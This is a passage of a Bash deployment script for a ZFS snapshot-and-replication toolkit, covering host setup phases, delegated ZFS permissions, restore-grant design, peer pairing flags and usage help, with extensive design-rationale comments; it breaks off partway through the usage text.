#!/bin/bash
# ------------------------------------------------------------------------------
# deploy.sh -- one script, one host, everything zfs-snapshot-all needs.
#
# Replaces the old deploy_new_server.sh + deploy_backup_user.sh pair. That split
# was historical, not conceptual: it forced an ordering ("run the other one
# first") that lived in a human's head rather than in the code, duplicated the
# helpers and the repo-checkout logic, and produced two separate --check-only
# verdicts for one machine. Everything below runs in the only correct order.
#
# What it does, in order:
#   1 dependencies          6 smoke test of the shipped executables
#   2 repo checkout         7 root auto-pull cron line
#   3 shared alert state    8 delegated non-root account (optional, see below)
#   4 notify + digest
#   5 capacity alerting
#
# Idempotent: safe to re-run, every part skips what is already done. It does NOT
# touch the actual snapsend/snapget/delsnaps job lines -- those are per-host and
# belong to gen-cron.sh.
#
#   bash deploy.sh                      # host setup; maintains an existing
#                                       # delegated account if one is found
#   bash deploy.sh --check-only         # audit, change nothing
#   bash deploy.sh --alerts=immediate   # mail every finding (see below)
#   bash deploy.sh --backup-user=zfsbackup   # also CREATE the delegated account
# ------------------------------------------------------------------------------
set -uo pipefail

# ==============================================================================
#  WHAT THIS HOST GETS -- edit here, or override with a flag for one run
# ==============================================================================
# Where alerts are mailed. Defaults to local root mail, which is deliverable on
# any host without configuring anything -- a remote address baked in here would
# mean a fresh install silently mails a stranger, and the operator who needs the
# alert never learns it fired. Set it with --email=ADDR, or here for a fleet.
#
# Only used when /etc/zfs-alert.conf does not yet exist. Once that file is
# written its ZFS_ALERT_EMAIL wins at runtime and re-running deploy.sh never
# overwrites it, so changing this default cannot move an existing host's alerts.
NOTIFY_EMAIL="${NOTIFY_EMAIL:-root}"

# daily     = queue findings, ONE summary mail per host per day (default)
# immediate = mail each finding as it happens. Worth setting while bringing a
#             host up: a misconfigured job you hear about within the hour is a
#             five-minute fix, the same mistake read in tomorrow's digest has
#             already cost a night of backups.
# Only used when /etc/zfs-alert.conf does not exist yet -- an existing one is
# never overwritten, so a hand-edited mode survives every re-run.
ALERT_MODE="daily"

# The delegated non-root account. THIS VARIABLE IS ABOUT CREATION, NOT
# MAINTENANCE:
#   empty        -- never create an account, but AUTO-DETECT an existing one and
#                   keep it maintained (scripts, log rotation, alert access)
#   "zfsbackup"  -- create it if missing, then maintain it
# So a bare `bash deploy.sh` does the right thing on every host in the fleet
# without anyone having to remember which machine has an account and which does
# not; creating one stays a deliberate, explicit act.
BACKUP_USER=""
# What that account gets delegated, when it is created. These two are the stock
# Proxmox VE layout, not one site's paths: `rpool/data` is where the installer
# puts guest disks, and `rpool/ROOT/pve-1` is the root filesystem dataset the
# installer creates under that literal name regardless of the node's hostname
# (verified across three differently-named nodes). Override with --datasets="A B"
# on any host that departs from it -- a non-Proxmox host almost certainly does.
BACKUP_USER_DATASETS="rpool/data rpool/ROOT/pve-1"

# Where this host pulls its updates from -- and, for a delegated account, where
# ITS own checkout is cloned from.
#
# Deliberately NOT a hardcoded upstream URL. It is derived below from the origin
# of the checkout THIS script is running out of, so a fork deploys itself rather
# than the original author's `main`. Hardcoding it meant that anyone who cloned
# this repo got hosts that fetched somebody else's tree every hour -- their own
# commits would never reach their own machines, and an upstream change would
# land on them unreviewed.
#
# Set it here (or in the environment) only to override that derivation.
REPO_URL="${REPO_URL:-}"
# Overridable so the self-update tests can drive a throwaway checkout instead
# of the live one. Production never sets these.
# The single crontab writer, taken from BESIDE this script rather than from
# $REPO_DIR: REPO_DIR is where the repo is being deployed TO, and on a first run
# it may not exist yet, while this file is by definition next to the one being
# executed.
_DEPLOY_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

# Resolve REPO_URL now that $_DEPLOY_DIR exists (see the config block above).
# `git remote get-url origin` on the checkout this file lives in is the only
# answer that is right for BOTH the upstream repo and any fork of it. The
# literal fallback is for a checkout with no origin at all -- unreachable in
# practice, since the source() below already refuses to run outside a complete
# checkout, but a bare URL beats an empty one that would make `git clone ""`
# the failure the operator has to diagnose.
if [ -z "$REPO_URL" ]; then
    REPO_URL="$(git -C "$_DEPLOY_DIR" remote get-url origin 2>/dev/null)"
    [ -n "$REPO_URL" ] || REPO_URL="https://github.com/AdalbertKing/zfs-snapshot-all.git"
fi

if [ -r "$_DEPLOY_DIR/lib-cron.sh" ]; then
    # shellcheck disable=SC1090
    source "$_DEPLOY_DIR/lib-cron.sh"
else
    echo "deploy.sh: cannot read $_DEPLOY_DIR/lib-cron.sh -- this checkout is incomplete; a fallback would be a fourth way of editing crontabs, which is the thing being removed" >&2
    exit 1
fi
# pc_is_dataset/account/label/port live in lib-scope.sh now. They validate the
# pairing package here and the scope file there, and the rules must be one
# thing: both are untrusted structured data arriving from another host.
if [ -r "$_DEPLOY_DIR/lib-scope.sh" ]; then
    # shellcheck disable=SC1090
    source "$_DEPLOY_DIR/lib-scope.sh"
else
    echo "deploy.sh: cannot read $_DEPLOY_DIR/lib-scope.sh -- this checkout is incomplete; it carries the validators this script applies to every package it opens" >&2
    exit 1
fi

# Every cron line deploy.sh owns lives in ONE named block. Two of them used to
# sit loose in root's crontab, indistinguishable from a human's -- see the
# header of lib-cron.sh. The name and tail match what zfs-backup.sh already
# writes, because it is the same block: host-level jobs, one owner for the
# mechanism, several requesters for the content.
CRON_HOST_BLOCK='zfs-backup-host'
CRON_HOST_TAIL='(host-level jobs kept by zfs-backup.sh -- do not hand-edit)'

REPO_DIR="${REPO_DIR:-/root/scripts/zfs-snapshot-all}"
# Shared state that outlives one run: the alert queue, and the self-update
# bookkeeping below. Defined HERE, in the config block, because the self-update
# path is dispatched near the top of the file and referenced it before its old
# mid-file definition ran -- which made every plain deploy.sh invocation die on
# `ALERT_SHARED_DIR: unbound variable`.
ALERT_SHARED_DIR="${ALERT_SHARED_DIR:-/var/lib/zfs-snapshot-all}"
# Lives here, beside the directory it sits inside, for the reason the paragraph
# above already learned the hard way: Phase 4 needs it and Phase 4 runs long
# before the pair-gate section that used to define it.
PAIR_GATE_STATE_DIR="${PAIR_GATE_STATE_DIR:-/var/lib/zfs-snapshot-all/relationships}"

# WHERE A RESTORE GRANT LIVES, and it is deliberately NOT under
# $PAIR_GATE_STATE_DIR/<label>.
#
# That directory is root:<account> mode 0775 -- group-WRITABLE by the delegated
# account, on purpose: the owner's 2026-08-06 model lets the relationship's own
# key lift a hard pause, and lifting it means unlinking a marker IN that
# directory. Anything else placed there inherits that permission.
#
# A restore grant placed there could therefore be CREATED BY THE COLLECTOR'S OWN
# ACCOUNT. The grant exists precisely to stop the collector authorising itself
# to overwrite this machine, so putting it in a directory the collector can
# write is not a weakness in the mechanism -- it is the mechanism doing nothing
# at all. `docs/design/client-granted-restore.md` § 3 said "root-owned, the
# account has read-only access" and named a path that is neither.
#
# So: a separate tree, root:root, world-readable and writable by nobody but
# root. The gate runs AS the account and only ever reads it.
RESTORE_GRANT_DIR="${RESTORE_GRANT_DIR:-/var/lib/zfs-snapshot-all/restore-grants}"

# WHAT A RESTORE NEEDS THAT A BACKUP NEVER DID, measured on the lab 2026-08-27.
#
# The relationship account on a SOURCE holds the backup set:
#     bookmark,destroy,hold,mount,release,send,snapshot
# It can read its data out and manage its own snapshots. It cannot `receive` and
# it cannot `rollback`, so a collector reaching that account today physically
# cannot overwrite the machine -- which corrects a claim made earlier in this
# work, that the capability already existed and was merely ungated. It does not
# exist.
#
# That is a better design than the one assumed, and it is the reason the grant
# issues BOTH halves together: the file that says "you may" and the delegation
# that makes it possible. Neither alone lets a restore happen, and revoking
# takes both back, so the window is exactly the grant's lifetime.
#
# `mount` and `canmount` are here because a received dataset that cannot be
# mounted is not a restored one; `create` because a subtree may need a level the
# target no longer has.
# `mountpoint` is here because a received stream carries properties and the
# receive sets them. Without it the transfer still lands but says "cannot receive
# mountpoint property: permission denied" -- a restore that put the data back and
# not the property that says where it belongs. Measured on the lab 2026-08-27.
RESTORE_ZFS_PERMS="${RESTORE_ZFS_PERMS:-receive,rollback,create,canmount,mount,mountpoint,destroy}"

# alert_dir_chgrp <dir> <group> <excluded subtree>
#
# Phase 4 used to do this with a plain `chgrp -R "$ALERT_GROUP"
# "$ALERT_SHARED_DIR"`, and that swept straight through the pair-gate's
# relationship state -- which lives under the same root and is deliberately
# owned differently: root:<the relationship's own account>, so that account,
# and only it, can create or remove its disabled marker.
#
# The consequence was measured on metropolis 2026-08-20 and it is not small:
# EVERY deploy.sh run re-broke the hard pause on every relationship on the host.
# `disable-client` then failed with
#     zfs-pair-gate: .../relationships/<label>/disabled.new: Permission denied
# and repairing it by hand held only until the next deploy, self-update or
# --commit-scope. A relationship-blocking mechanism that any routine run
# silently disarms is worse than one that is absent, because the operator
# believes they have it.
#
# The sweep keeps its repair job -- old alert files predating the setgid bit
# still need the group -- and simply stops walking into a subtree it does not
# own. Prune by path, and prune before -exec, so the excluded directory is
# neither changed nor descended into.
alert_dir_chgrp() {
    local dir="$1" group="$2" excluded="$3"
    find "$dir" -path "$excluded" -prune -o -exec chgrp "$group" {} +
}

# The permission set a delegated account needs to run the scripts at all. ONE
# definition, because it is delegated from two unrelated places -- Phase 8 (this
# host's own backup account) and --pair (a pull target's per-peer root). Two
# hand-kept lists is exactly how the 'delegation-verbs' contract rots.
#
# 'bookmark' is easy to leave out and fails quietly: without it every send ends
# "cannot create bookmark ... permission denied", logged as non-fatal, and the
# transfer still succeeds -- so nothing alerts. What is lost is the
# bookmark-backed incremental fallback: once the common-base SNAPSHOT is pruned
# on the source, that pair can only recover with a full resend. Found live on
# metropolis pve1, 2026-07-25.
ZFS_PERMS="snapshot,destroy,send,receive,create,mount,rollback,hold,release,canmount,bookmark"
# ==============================================================================

# PROBLEMS lets --check-only return a meaningful exit code for the WHOLE host,
# account included -- so an audit can be driven from a loop over 18 hosts
# instead of being read by eye.
PROBLEMS=0
log() { echo ">>> $*"; }
warn() { echo "!!! $*" >&2; PROBLEMS=$((PROBLEMS + 1)); }
die() { echo "FATAL: $*" >&2; exit 1; }

CHECK_ONLY=0
SEND_TEST_MAIL=0
# Set when THIS run creates the alert config, i.e. the host is being set up for
# the first time -- the only moment a delivery smoke test proves anything new.
FIRST_TIME_SETUP=0

# ---- peer pairing (--pair/--join) -- see PAIRING-DESIGN.md -----------------
PAIR_MODE=0
JOIN_MODE=0
JOIN_PACKAGE=""
JOIN_CHECK=0
# REV-20260802-033 slice 2: --join no longer grants (see do_join). Grants for a
# pull peer are a separate, deliberate act against the scope file the operator
# edited on this host -- see lib-scope.sh's header and peer_scope_path below.
COMMIT_SCOPE_MODE=0
COMMIT_SCOPE_CHECK=0
COMMIT_SCOPE_LABEL=""
# REV-20260802-033 slice 4: generates the scope file --commit-scope reads,
# from this host's own real ZFS inventory (F1/F2 -- source scope is selected
# on the SOURCE host, discovered from it, never guessed by the collector
# operator or hand-typed from memory).
DRAFT_SCOPE_MODE=0
DRAFT_SCOPE_CHECK=0
DRAFT_SCOPE_LABEL=""
# REV-20260804-039 F3: run on the PEER (this host, where --join created the
# account), tearing down that side of a pull relationship. Distinct from
# --unpair (run on the COLLECTOR, tears down ITS side and only PRINTS
# instructions for this one) -- --leave actually executes them, bounded by
# THIS host's own join manifest, never a name/UID an operator typed.
LEAVE_MODE=0
LEAVE_LABEL=""

# ---- --pause/--resume: stop (and later restore) every crontab this host
# manages, for a maintenance window (disk swap, live migration off this host)
# where new snapshots would be actively unwelcome -- not just unhelpful.
# See docs/internal/reviews/responses/ for the incident this answers: a VM migration
# off a host ahead of hardware work, where an hour of untouched cron would
# hand pvesr's own send -Rpv | recv -F cycle a set of foreign snapshots to
# contend with while it is trying to re-establish replication in the other
# direction. Goes through lib-cron.sh's own lock/read-back, same as every
# other writer -- this is one more requester, not a bypass.
# GIVEN is tracked apart from the value, and it is not a nicety. The dispatch
# used to be `[ -n "$ALLOW_RESTORE_LABEL" ]`, so `--allow-restore=` with an
# empty value fell straight through it and deploy.sh went on to Phase 1 and
# started installing packages on the host. A verb that answers a PERMISSION
# question must never provision the machine on its way past -- that is the
# reviewer's F4 finding of 2026-08-26, and a typo is exactly how it recurs.
# Same discriminator deploy.sh already uses for --bandwidth.
ALLOW_RESTORE_GIVEN=0
DENY_RESTORE_GIVEN=0
SHOW_RESTORE_GIVEN=0
ALLOW_RESTORE_LABEL=""
DENY_RESTORE_LABEL=""
SHOW_RESTORE_LABEL=""
# `replace` is never implied. Owner direction 2026-08-26 ("REPLACE jawnie przy
# nadawaniu"): a grant that lets the collector write into free space must not
# also let it destroy what is already there. The operator says so when they are
# calm, not when the machine is already broken.
ALLOW_RESTORE_REPLACE=0
PAUSE_MODE=0
RESUME_MODE=0
# Default --pause/--resume touch only OUR managed blocks (comment out the
# body, leave everything else in the crontab running). --fullcron opts into
# the old, blunter behaviour: replace the WHOLE crontab with one placeholder
# line. See do_pause_blocks_one/do_pause_one below for why both still exist.
FULLCRON_MODE=0
# Whether this host lets the joining peer freeze its guests (remote quiesce).
# Deliberately a LOCAL flag, not a field in the package: freezing a guest is
# real power -- whoever can freeze can cause an outage by never thawing, and the
# script that performs the thaw is streamed BY THE COLLECTOR. So the decision
# belongs to the owner of the source host, not to the party asking for access.
# Off by default; without it remote quiesce simply refuses, loudly.
ALLOW_QUIESCE=0
# REV-20260802-028. --allow-quiesce REPLACES the whitelist, and that is right
# for enrolment: re-running --join with a narrower dataset list is supposed to
# drop what was removed, and the suite pins it. It is wrong for a REMEDIATION,
# where the caller knows only the datasets one config needs and the file may
# also carry grants from another config, an older deployment or a manual job.
# --add-quiesce is the merge-only, idempotent variant: same provisioning, union
# instead of overwrite.
QUIESCE_MERGE=0
# Account whose quiesce grant --revoke-quiesce should remove (join-side teardown).
REVOKE_QUIESCE_ACCOUNT=""
SELF_UPDATE=0
ROLLBACK=0
RESUME_UPDATES=0
# Where an unpacked package lives while it is being checked. Global so the
# EXIT trap can still see it; see do_join.
JOIN_WORKDIR=""
# While a guided --join is in progress, every non-zero exit ends with one
# stable command that resumes the whole operation. Low-level diagnostics may
# explain the cause, but the operator never has to reconstruct which internal
# subcommand comes next.
JOIN_RERUN_NEEDED=0
JOIN_RERUN_COMMAND=""
deploy_exit_cleanup() {
    local rc=$?
    rm -rf "${JOIN_WORKDIR:-}"
    if [ "$rc" -ne 0 ] && [ "${JOIN_RERUN_NEEDED:-0}" -eq 1 ]; then
        printf '\nPONOW DOKLADNIE: %s\n' "$JOIN_RERUN_COMMAND" >&2
    fi
    return "$rc"
}
PEER_ROLE="pull"
PEER_HOST=""
PEER_DATASETS=""
# LAB6 pass 7 F-1 (2026-08-22): what the COLLECTOR NAMED, for a mode-based
# relationship whose dataset LIST is still the source's to decide. Not a
# second dataset list and never granted from -- it exists so the source's
# --draft-scope can default its ACTIVE section to the request instead of to
# the whole estate. Empty for a bare `add-client --mode=...`, which genuinely
# named nothing; non-empty only for the one-command form
# `--source=HOST:DATASET --mode=sync`, which named a dataset and then dropped
# it on the floor. Measured live: an enrolment naming hdd/lab6chain drafted a
# scope covering hdd/vm-disks and rpool/data -- 5.4T of production -- with the
# printed next step being "run --commit-scope on the source".
PEER_REQUESTED=""
PEER_TARGET=""
# REV-20260802-033 slice 5 (F1): the alternative to --peer-datasets for a
# pull relationship -- the collector operator names a MODE instead of a
# source dataset list they cannot be expected to know yet. Empty means
# "not given" (the existing expert --peer-datasets path).
PEER_MODE=""
PEER_AS="delegated"
PEER_PORT="22"
# "22" is also what an omitted --port looks like, so a re-pair or --rotate had
# no way to tell "the admin wants 22" from "the admin didn't say" and quietly
# reset a non-standard port back to the default -- the same drift the manifest
# already guards against for role/target/--as.
PEER_PORT_GIVEN=0
PEER_ROTATE=0
PEER_REVOKE_OLD=0
PEER_DRAFT_CONFIG=0
PEER_UNPAIR=0
# REV-20260802-033 slice 9 / U10: opt-in, off by default -- see do_pair's own
# comment above the block this gates for the three conditions that make it
# safe (finalize stays local always; rides the pin already established by
# ssh-keyscan above; the peer's manifest records the remote origin).
PEER_JOIN_REMOTELY=0
# Ceiling on each remote step of --join-remotely (the scp and the ssh). Not a
# performance figure: the transfer is a small tarball and the remote --join is
# short, so anything this large means something is stuck rather than slow. It
# exists so a stall cannot outlive the operator's patience, and it is generous
# on purpose -- a bound that fires during normal work would be worse than none,
# because the first thing anyone does with a flaky timeout is remove it.
PEER_REMOTE_JOIN_TIMEOUT="${PEER_REMOTE_JOIN_TIMEOUT:-300}"
# The LOCAL account that will actually run the generated jobs. Independent of
# --as, which names the account on the PEER: one is who we log in as there, the
# other is who runs cron here. Empty means root runs the jobs.
PEER_LOCAL_USER=""
# Opt-in for a --peer name that resolves outside RFC1918. Off by default, see
# assert_peer_address_sane.
PEER_ALLOW_PUBLIC=0

while [ "$#" -gt 0 ]; do
    case "$1" in
        --check-only|--plan) CHECK_ONLY=1; shift ;;
        # --plan is the package-wide audit verb (zfs-backup.sh --plan,
        # zfs-restore.sh --plan); --check-only stays as the historical name.
        # Basket C: deploy.sh and zfs-backup.sh were the only two tools without
        # --version; the checkout SHA is the honest version here, because
        # deployment IS the hourly git pull.
        --version) echo "deploy.sh (zfs-snapshot-all) $(git -C "$_DEPLOY_DIR" rev-parse --short HEAD 2>/dev/null || echo unknown)"; exit 0 ;;
        --test-mail)    SEND_TEST_MAIL=1; shift ;;
        --alerts=*)     ALERT_MODE="${1#*=}"; shift ;;
        --alerts)       ALERT_MODE="${2:-}"; shift 2 ;;
        --backup-user=*) BACKUP_USER="${1#*=}"; shift ;;
        --backup-user)  BACKUP_USER="${2:-}"; shift 2 ;;
        # --grant-datasets is the honest name: this is the `zfs allow`
        # WHITELIST for the delegated account, not a replication list --
        # zfs-backup.sh add-client has a --datasets that means "what to
        # replicate", and one word carrying both meanings across the two
        # commands is how a whitelist ends up shaped like a request (basket A2).
        # --datasets stays accepted; every existing script keeps working.
        # Normalised AT THE DOOR like --peer-datasets: the package list grammar
        # is the comma (dataset_list_split), the space form was storage leaking
        # outward. Both parse; internally the space form flows on unchanged.
        --grant-datasets=*|--datasets=*) BACKUP_USER_DATASETS="$(dataset_list_split "${1#*=}" | tr '\n' ' ')"; BACKUP_USER_DATASETS="${BACKUP_USER_DATASETS% }"; shift ;;
        --grant-datasets|--datasets)     BACKUP_USER_DATASETS="$(dataset_list_split "${2:-}" | tr '\n' ' ')"; BACKUP_USER_DATASETS="${BACKUP_USER_DATASETS% }"; shift 2 ;;
        --email=*)      NOTIFY_EMAIL="${1#*=}"; shift ;;
        --email)        NOTIFY_EMAIL="${2:-}"; shift 2 ;;
        --pair)         PAIR_MODE=1; shift ;;
        --join=*)       JOIN_MODE=1; JOIN_PACKAGE="${1#*=}"; shift ;;
        --join)         JOIN_MODE=1; JOIN_PACKAGE="${2:-}"; shift 2 ;;
        --self-update)     SELF_UPDATE=1; shift ;;
        --rollback)        ROLLBACK=1; shift ;;
        --resume-updates)  RESUME_UPDATES=1; shift ;;
        --allow-quiesce) ALLOW_QUIESCE=1; shift ;;
        --add-quiesce)   ALLOW_QUIESCE=1; QUIESCE_MERGE=1; shift ;;
        --revoke-quiesce=*) REVOKE_QUIESCE_ACCOUNT="${1#*=}"; shift ;;
        --revoke-quiesce)   REVOKE_QUIESCE_ACCOUNT="${2:-}"; shift 2 ;;
        --join-check=*) JOIN_CHECK=1; JOIN_PACKAGE="${1#*=}"; shift ;;
        --join-check)   JOIN_CHECK=1; JOIN_PACKAGE="${2:-}"; shift 2 ;;
        --commit-scope=*)       COMMIT_SCOPE_MODE=1; COMMIT_SCOPE_LABEL="${1#*=}"; shift ;;
        --commit-scope)         COMMIT_SCOPE_MODE=1; COMMIT_SCOPE_LABEL="${2:-}"; shift 2 ;;
        --draft-scope=*)        DRAFT_SCOPE_MODE=1; DRAFT_SCOPE_LABEL="${1#*=}"; shift ;;
        --draft-scope)          DRAFT_SCOPE_MODE=1; DRAFT_SCOPE_LABEL="${2:-}"; shift 2 ;;
        --leave=*)               LEAVE_MODE=1; LEAVE_LABEL="${1#*=}"; shift ;;
        --leave)                 LEAVE_MODE=1; LEAVE_LABEL="${2:-}"; shift 2 ;;
        --draft-scope-check=*)  DRAFT_SCOPE_CHECK=1; DRAFT_SCOPE_LABEL="${1#*=}"; shift ;;
        --draft-scope-check)    DRAFT_SCOPE_CHECK=1; DRAFT_SCOPE_LABEL="${2:-}"; shift 2 ;;
        --commit-scope-check=*) COMMIT_SCOPE_CHECK=1; COMMIT_SCOPE_LABEL="${1#*=}"; shift ;;
        --commit-scope-check)   COMMIT_SCOPE_CHECK=1; COMMIT_SCOPE_LABEL="${2:-}"; shift 2 ;;
        --pause)        PAUSE_MODE=1; shift ;;
        --allow-restore=*) ALLOW_RESTORE_LABEL="${1#*=}"; ALLOW_RESTORE_GIVEN=1; shift ;;
        --deny-restore=*)  DENY_RESTORE_LABEL="${1#*=}"; DENY_RESTORE_GIVEN=1; shift ;;
        --show-restore=*)  SHOW_RESTORE_LABEL="${1#*=}"; SHOW_RESTORE_GIVEN=1; shift ;;
        --replace)         ALLOW_RESTORE_REPLACE=1; shift ;;
        --resume)       RESUME_MODE=1; shift ;;
        --fullcron)     FULLCRON_MODE=1; shift ;;
        --role=*)       PEER_ROLE="${1#*=}"; shift ;;
        --role)         PEER_ROLE="${2:-}"; shift 2 ;;
        # --host= is the alias: zfs-backup.sh's normal form for the other
        # machine is --host, deploy grew up with --peer, and the concept is one
        # (basket B2). Both parse; --peer stays the documented form HERE because
        # every runbook and printed instruction on the fleet says --peer.
        --peer=*|--host=*) PEER_HOST="${1#*=}"; shift ;;
        --peer)         PEER_HOST="${2:-}"; shift 2 ;;
        # Normalised at the door, not at every reader. The package's list
        # grammar is the comma (dataset_list_split, lib-scope.sh); the SPACE
        # here was never a grammar, it was PEER_SAVED_DATASETS' storage format
        # leaking outward. Both are accepted, and what is stored downstream is
        # the space-separated form every existing manifest and unquoted `for`
        # already expects -- so this is a widening, not a break.
        --peer-datasets=*) PEER_DATASETS="$(dataset_list_split "${1#*=}" | tr '
' ' ')"; PEER_DATASETS="${PEER_DATASETS% }"; shift ;;
        --peer-datasets)   PEER_DATASETS="$(dataset_list_split "${2:-}" | tr '
' ' ')"; PEER_DATASETS="${PEER_DATASETS% }"; shift 2 ;;
        # Same normalisation as --peer-datasets, deliberately: the two carry the
        # same kind of value (a dataset list the collector typed) and differ only
        # in what they AUTHORISE -- this one authorises nothing.
        --peer-requested=*) PEER_REQUESTED="$(dataset_list_split "${1#*=}" | tr '
' ' ')"; PEER_REQUESTED="${PEER_REQUESTED% }"; shift ;;
        --peer-requested)   PEER_REQUESTED="$(dataset_list_split "${2:-}" | tr '
' ' ')"; PEER_REQUESTED="${PEER_REQUESTED% }"; shift 2 ;;
        --mode=*)       PEER_MODE="${1#*=}"; shift ;;
        --mode)         PEER_MODE="${2:-}"; shift 2 ;;
        --target=*)     PEER_TARGET="${1#*=}"; shift ;;
        --target)       PEER_TARGET="${2:-}"; shift 2 ;;
        --as=*)         PEER_AS="${1#*=}"; shift ;;
        --as)           PEER_AS="${2:-}"; shift 2 ;;
        --port=*)       PEER_PORT="${1#*=}"; PEER_PORT_GIVEN=1; shift ;;
        --port)         PEER_PORT="${2:-}"; PEER_PORT_GIVEN=1; shift 2 ;;
        --local-user=*) PEER_LOCAL_USER="${1#*=}"; shift ;;
        --local-user)   PEER_LOCAL_USER="${2:-}"; shift 2 ;;
        --allow-public-peer) PEER_ALLOW_PUBLIC=1; shift ;;
        --rotate)       PEER_ROTATE=1; shift ;;
        --revoke-old)   PEER_REVOKE_OLD=1; shift ;;
        --join-remotely) PEER_JOIN_REMOTELY=1; shift ;;
        --draft-config) PEER_DRAFT_CONFIG=1; shift ;;
        # Implies --pair so it reads as the opposite of it -- `--unpair --peer=X`
        # rather than the `--pair --unpair` the other sub-modes would suggest.
        --unpair)       PEER_UNPAIR=1; PAIR_MODE=1; shift ;;
        -h|--help)
            cat <<'USAGE'
Usage: deploy.sh [options]
  --check-only            audit only; install, create and modify nothing
  --test-mail             send a delivery smoke test (automatic on first setup only)
  --alerts=daily          (default) queue findings, one summary mail per day
  --alerts=immediate      mail each finding at once -- use while bringing a host up
  --backup-user=NAME      also create the delegated non-root account NAME.
                          Omit it and an EXISTING account is still detected and
                          maintained; only creation needs to be asked for.
  --grant-datasets="A,B"  datasets to DELEGATE to that account (the zfs allow
                          whitelist -- not a replication list; that one lives in
                          zfs-backup.sh add-client). --datasets is an accepted
                          alias; comma or space separated, like every list here.
  --allow-quiesce         additionally let that account FREEZE the guests whose
                          disks live under those datasets (local quiesce -- what
                          a managed block using 'quiesce = auto' needs once it
                          runs as the account instead of root). Off by default,
                          never revoked by a plain re-run; --revoke-quiesce
                          removes it. The whitelist is the --datasets list, so
                          naming a PARENT makes every guest under it freezable.
  --email=ADDR            where alerts are mailed
Defaults are the config block at the top of this script -- edit them there to
make them permanent for a host.

Peer pairing -- two hosts with NO prior trust (see PAIRING-DESIGN.md):
  --pair                  initiate pairing with a peer (run on the host that
                          will connect: the collector for --role=pull, the
                          source for --role=push)
    --role=pull|push        pull (default): this host pulls via snapget.sh.
                            push: this host pushes via snapsend.sh.
    --peer=HOST             the other host's hostname/IP
    --peer-datasets="A,B"   expert path: datasets involved in this
                            relationship, named here directly. For
                            --role=pull this means the SOURCE's own datasets
                            -- an operator who does not know that layout
                            should use --mode instead (mutually exclusive).
    --mode=backup|sync      --role=pull only: defer dataset selection to
                            the peer (F1) instead of naming datasets here.
                            backup: --target may still be given, or omitted
                            to inherit the collector's own default (resolved
                            by the wrapper, not this command). sync: no
                            --target -- the peer reproduces its own paths
                            here verbatim (F3), so there is no target root
                            to name. Either way, the peer runs
                            --draft-scope/--commit-scope after --join to
                            choose and grant what it actually has.
    --target=DATASET        where snapshots land -- local dataset for pull,
                            remote dataset (on the peer) for push
    --as=root|delegated     delegated (default): isolated per-peer account on
                            the peer. root: parity with today's clustered
                            hosts -- no isolation, use only when the hosts
                            already fully trust each other
    --local-user=NAME       the account HERE that will run the generated jobs
                            (e.g. zfsbackup). Installs a readable copy of the
                            pairing key AND of the peer's pinned host key for
                            it, and for --role=pull delegates the target root
                            to it. Independent of --as, which is about the
                            account on the PEER. Omit and the jobs are assumed
                            to run as root.
    --port=N                ssh port (default 22)
    --allow-public-peer     accept a --peer NAME that resolves outside RFC1918
                            (refused by default -- see the note on search
                            domains in PAIRING-DESIGN.md). Not needed when
                            --peer is a literal IP address.
    --rotate                generate a new key alongside the existing one
    --revoke-old             finish a rotation: remove the old key on both ends
    --join-remotely          opt-in (REV-20260802-033 U10): after producing
                            the wsad, deliver it and run --join on the peer
                            over the host key just pinned, using THIS
                            operator's own ssh access -- then, for a mode-
                            based pairing, open the scope editor there over
                            ssh -t. Finalize (--commit-scope, the grant)
                            never runs remotely, under any flag. Off by
                            default: the default path stays printing the
                            wsad and the exact commands to run by hand.
    --draft-config           after --join has run on the peer: list its
                            datasets and write a reviewed-by-hand .suggested
                            file (never installs anything)
    --unpair                end the relationship on THIS host (keys, pinned
                            host key, manifest, local delegation) and print
                            the commands to run on the peer. Never touches
                            received data, and refuses while a cron line
                            still uses the pairing key.
  --join=PACKAGE          consume a wsad produced by --pair on the OTHER host
                          (run on the second host, from its console). For a
                          delegated pull it completes the normal enrolment in
                          one guided run: account/key, ZFS discovery, scope
                          preview with accept/edit choice, validation and grant.
                          Safe to re-run after an interruption.
  --draft-scope=LABEL     generate /etc/zfs-snapshot-all/peers/LABEL.scope
                          from THIS host's real ZFS inventory: an active
                          section (non-system datasets one level below each
                          pool) plus the complete inventory, commented, to
                          edit from. Refuses if the file already exists --
                          edit or remove it by hand first. Run this BEFORE
                          --commit-scope; discovery happens here, on the
                          source, never guessed by the collector operator.
  --draft-scope-check=LABEL
                          validate LABEL without writing anything: manifest
                          exists, role is pull, and no scope file exists yet.
  --commit-scope=LABEL    grant a pull peer's account exactly what
                          /etc/zfs-snapshot-all/peers/LABEL.scope selects
                          (LABEL is the initiator label --join printed).
                          Edit that file by hand first -- see lib-scope.sh's
                          header for the grammar. Re-running after an edit
                          re-grants the new set AND revokes what THIS
                          relationship granted before but the new set no
                          longer selects (bounded by the manifest -- a grant
                          from another relationship or by hand is never
                          touched, and a dataset with an in-flight transfer
                          hold is left granted until the next commit).
    --allow-quiesce       also let that peer FREEZE guests whose disks live
                          under the granted datasets (remote quiesce). Off by
                          default, same reasoning as --join's own
                          --allow-quiesce below.
  --commit-scope-check=LABEL
                          validate LABEL.scope without granting anything:
                          manifest exists, role is pull, scope file parses.
  --revoke-quiesce=ACCOUNT
                          remove ACCOUNT's guest-quiesce grant on THIS host
                          (whitelist + sudoers rule). The helper itself is
                          shared by every peer and is kept -- without a grant
                          it refuses the account anyway.
    --allow-quiesce       additionally let the joining peer FREEZE guests on
                          this host (remote quiesce, snapget -q), limited to
                          guests whose disks live under the delegated datasets.
                          Off by default: whoever can freeze can cause an
                          outage by never thawing, so this host decides -- the
                          package cannot ask for it.
  --leave=LABEL           run on THIS host (the peer, where --join created the
                          account) to actually tear it down -- unlike --unpair
                          on the collector, which only PRINTS these steps.
                          Revokes the ZFS grant by numeric UID (works even if
                          the account is already gone), verifies nothing
                          remains, revokes any quiesce grant, THEN removes the
                          account. Refuses if a granted dataset has an
                          in-flight transfer hold rather than stranding it.
                          Safe to re-run after a partial failure.

Maintenance window -- stop and later restore what this host's crontabs run
(root's, and the delegated account's if one exists or --backup-user names
one). For hardware work or a live migration off this host, where an hour of
untouched cron would hand pvesr foreign snapshots to contend with:
  --pause                 comment out the body of every managed block this
                          package owns (zfs-backup-host, zfs-backup-managed)
                          in both crontabs. Anything else in those crontabs
                          -- a human's own cron lines -- keeps running.
                          Refuses a block that already looks paused.
  --pause --fullcron      the blunter old behaviour: save the WHOLE crontab,
                          then replace it with one placeholder line. Use this
                          only when you want NOTHING at all left running for
                          that user, managed or not.
  --resume                undo whichever of the above is found: restores any
